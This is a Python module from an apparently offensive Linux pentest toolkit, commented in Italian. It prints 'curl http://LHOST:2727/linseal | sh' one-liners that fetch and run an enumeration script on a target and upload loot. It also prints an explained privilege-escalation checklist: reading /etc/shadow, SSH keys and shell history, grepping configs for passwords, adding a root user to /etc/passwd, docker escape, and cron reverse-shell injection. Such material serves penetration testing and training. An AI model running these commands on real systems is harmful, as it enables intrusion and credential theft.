"""linseal — enumerazione Linux / privesc "a mano".

Comandi console:
    linseal                 One-liner per lanciare lo script sulla target
    linseal -i              Checklist dei comandi SPIEGATI per replicare
                            lo scan manualmente, senza eseguire linseal.sh
"""

from __future__ import annotations

import argparse


# ---------------------------------------------------------------------------
# Renderer condiviso: comandi spiegati (usato anche da recon -i)
# ---------------------------------------------------------------------------

def render_explained(header: str, intro: list[str],
                     sections: list[tuple[str, list[tuple[str, str | None]]]],
                     verbose: bool = False,
                     essential: tuple[str, ...] = ()) -> None:
    """Stampa sezioni di comandi.

    verbose=False: solo i comandi essenziali (quelli che contengono una delle
                   sottostringhe `essential`), nudi, pronti da copiare.
    verbose=True:  tutti i comandi, ognuno preceduto da '# spiegazione';
                   le note (comando None) diventano bullet '•'.
    """
    print(f"\n  \033[1m{header}\033[0m")
    if verbose:
        for line in intro:
            print(f"  {line}")
        print()
    for title, items in sections:
        if verbose:
            rows = items
        else:
            rows = [(e, c) for e, c in items
                    if c and any(k in c for k in essential)]
            if not rows:
                continue
        print(f"  \033[93;1m══ {title} ══\033[0m")
        for expl, cmd in rows:
            if not verbose:
                print(f"    {cmd}")
            elif cmd is None:
                lines = expl.split("\n")
                print(f"    \033[2m• {lines[0]}\033[0m")
                for ln in lines[1:]:
                    print(f"    \033[2m  {ln}\033[0m")
            else:
                if expl:
                    for ln in expl.split("\n"):
                        print(f"    \033[2m# {ln}\033[0m")
                print(f"    {cmd}")
        print()
    if not verbose:
        print("  \033[2m# con -v vedi TUTTI i comandi e le spiegazioni (es. -vi)\033[0m\n")


# ---------------------------------------------------------------------------
# Checklist linseal spiegata (rispecchia static/linseal.sh)
# ---------------------------------------------------------------------------

# I comandi mostrati da 'linseal -i' (senza -v): pochi ma essenziali
_LINSEAL_ESSENTIAL = (
    "id",                      # id
    "sudo -l",                 # privilegi sudo
    "-perm -4000",             # SUID
    "getcap -r",               # capabilities
    "cat /etc/crontab",        # cron di sistema
    "ss -tlnp",                # porte in ascolto
    "id_rsa",                  # chiavi SSH
    "grep -rilE 'passw",       # password nei config
    "bash_history",            # history
    "uname -a",                # kernel
)


def _linseal_sections() -> list[tuple[str, list[tuple[str, str | None]]]]:
    return [
        ("CHI SEI", [
            ("Utente, gruppi e privilegi sudo. Gruppi pericolosi: docker, lxd, disk, adm\n"
             "(docker → docker run -v /:/mnt --rm -it alpine chroot /mnt sh)", "id"),
            ("Cosa puoi eseguire come root. NOPASSWD o comandi noti (vim, find,\n"
             "python, tar...) → cercali su GTFOBins per il privesc", "sudo -l"),
        ]),
        ("SUID / SGID", [
            ("Binari SUID: quelli NON standard (non su/sudo/ping/passwd...) sono\n"
             "candidati privesc → GTFOBins", "find / -perm -4000 -type f 2>/dev/null"),
            ("Stessa cosa per i SGID", "find / -perm -2000 -type f 2>/dev/null"),
        ]),
        ("CAPABILITIES", [
            ("cap_setuid → diventi root; cap_sys_admin → mount/namespace;\n"
             "cap_dac_override → leggi/scrivi tutto", "getcap -r / 2>/dev/null"),
        ]),
        ("FILE CRITICI SCRIVIBILI", [
            ("Se /etc/passwd è scrivibile → aggiungi un utente root:\n"
             "echo 'root2:'$(openssl passwd pass)':0:0::/root:/bin/bash' >> /etc/passwd",
             "ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/crontab"),
            ("Directory cron/sudoers scrivibili → piazzi uno script eseguito come root",
             "ls -ld /etc/cron.* /etc/sudoers.d 2>/dev/null"),
            ("Se esiste ed è scrivibile → privesc immediato (shared library)",
             "ls -l /etc/ld.so.preload 2>/dev/null"),
        ]),
        ("CRON & TIMER", [
            ("Job di sistema: cerca script eseguiti come root", "cat /etc/crontab; ls -la /etc/cron.*"),
            ("Il tuo crontab utente", "crontab -l"),
            ("Se uno script lanciato dal cron è scrivibile → inietti una reverse shell\n"
             "e aspetti che il cron lo esegua come root",
             "grep -rhE '^[^#].*/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oE '/[^ ]+' | sort -u"),
            ("Timer systemd (equivalente moderno del cron)", "systemctl list-timers --all 2>/dev/null"),
        ]),
        ("PROCESSI", [
            ("Processi root interessanti (python, mysql, docker, apache...):\n"
             "possono contenere credenziali nella cmdline o essere sfruttabili",
             "ps aux | grep -vE '^\\[' | grep '^root'"),
        ]),
        ("RETE", [
            ("Porte in ascolto solo su localhost → raggiungibili con port forwarding\n"
             "(pivoting) una volta dentro", "ss -tlnp"),
            ("Se manca ss/netstat ma c'è rustscan: tutte le porte locali in ~1s",
             "rustscan -g -a 127.0.0.1 -t 500"),
            ("Se rustnet è installato: vista live TUI di connessioni e processi",
             "rustnet"),
            ("Interfacce, rotte e vicini di rete: mappa per muoverti lateralmente",
             "ip a; ip r; arp -a"),
        ]),
        ("CREDENZIALI & FILE INTERESSANTI", [
            ("Shadow leggibile → crack degli hash con john/hashcat", "cat /etc/shadow 2>/dev/null"),
            ("Chiavi SSH in giro per il filesystem",
             "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null"),
            ("Config con password in chiaro (wp-config, .env, database.yml...)",
             "grep -rilE 'passw|secret|token' /var/www /opt /home /etc --include='*.conf' --include='*.php' --include='.env' 2>/dev/null | head"),
            ("History delle shell: spesso contiene password digitate a mano",
             "cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null"),
            ("File nascosti con credenziali: .netrc, .pgpass, .my.cnf,\n"
             ".aws/credentials, .git-credentials, .docker/config.json",
             "ls -la ~/ 2>/dev/null; ls -la /home/*/ 2>/dev/null"),
            ("Backup e database dimenticati",
             "find / -maxdepth 4 \\( -name '*.bak' -o -name '*backup*' -o -name '*.sql' -o -name '*.db' \\) -readable 2>/dev/null | head -20"),
            ("Mail degli utenti: reset password, credenziali inviate in chiaro",
             "cat /var/mail/* 2>/dev/null"),
        ]),
        ("UTENTI & HOME", [
            ("Utenti con shell valida (possibili target di pivoting)",
             "cat /etc/passwd | grep -E 'sh$'"),
            ("Home leggibili: .ssh, file personali, config",
             "ls -la /home/*/ 2>/dev/null; ls -la /root 2>/dev/null"),
        ]),
        ("PATH HIJACKING & MISC PRIVESC", [
            ("Directory del PATH scrivibili → piazzi un binario finto con lo stesso\n"
             "nome di un comando che root eseguirà", "echo $PATH | tr ':' '\\n'"),
            ("Script/binari di root scrivibili → inietti codice eseguito come root",
             "find /usr/local/bin /opt /etc/init.d -type f -user root -writable 2>/dev/null"),
            ("ptrace_scope=0 → puoi iniettarti nei processi in esecuzione (ssh-agent...)",
             "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null"),
            ("NFS con no_root_squash → monti e piazzi un binario SUID root",
             "cat /etc/exports 2>/dev/null"),
        ]),
        ("WEB APP", [
            ("Webroot e config delle applicazioni: password DB in wp-config & co.",
             "ls -la /var/www/html 2>/dev/null; grep -iE 'passw|db_' /var/www/*/wp-config.php 2>/dev/null"),
        ]),
        ("CONTAINER & KERNEL", [
            ("Sei in un container? Se sì, cerca vie di escape",
             "ls /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head"),
            ("Versione kernel → exploit noti (dirtycow, pwnkit...)",
             "uname -a; cat /etc/os-release | head -2"),
        ]),
    ]


def _print_linseal_info(verbose: bool = False) -> None:
    render_explained(
        "LINSEAL — replicare lo scan a mano" + (" (verbose)" if verbose else ""),
        ["Questi sono i comandi che linseal.sh esegue in automatico,",
         "spiegati uno per uno: copiali sulla target nell'ordine che preferisci.",
         "Solo tool preinstallati ovunque (find, grep, ss, cat...).",
         "Questa modalità è solo informativa: nessun comando viene eseguito."],
        _linseal_sections(),
        verbose=verbose,
        essential=_LINSEAL_ESSENTIAL,
    )
    if verbose:
        print("  \033[2mRegole d'oro: SUID non standard → GTFOBins · gruppi docker/lxd/disk → privesc\033[0m")
        print("  \033[2mdiretto · sudo NOPASSWD → GTFOBins · cap_setuid/cap_sys_admin → root\033[0m\n")


def cmd_linseal(args: argparse.Namespace, state=None) -> int:
    if getattr(args, "info", False):
        _print_linseal_info(verbose=getattr(args, "verbose", False))
        return 0
    print()
    print("  \033[1mlinseal\033[0m — Enumerazione Linux / privesc\n")
    print("  Sulla macchina target (con il server SeaLion attivo, porta 2727):")
    print("    curl http://LHOST:2727/linseal | sh          # scan base")
    print("    curl http://LHOST:2727/linseal?ol | sh       # salva output + upload loot")
    print("    curl http://LHOST:2727/linseal?ols | sh      # silenzioso + output + loot")
    print()
    print("  \033[96mlinseal -i\033[0m   comandi essenziali per replicare lo scan a mano")
    print("  \033[96mlinseal -vi\033[0m  tutti i comandi, con spiegazioni")
    print()
    return 0
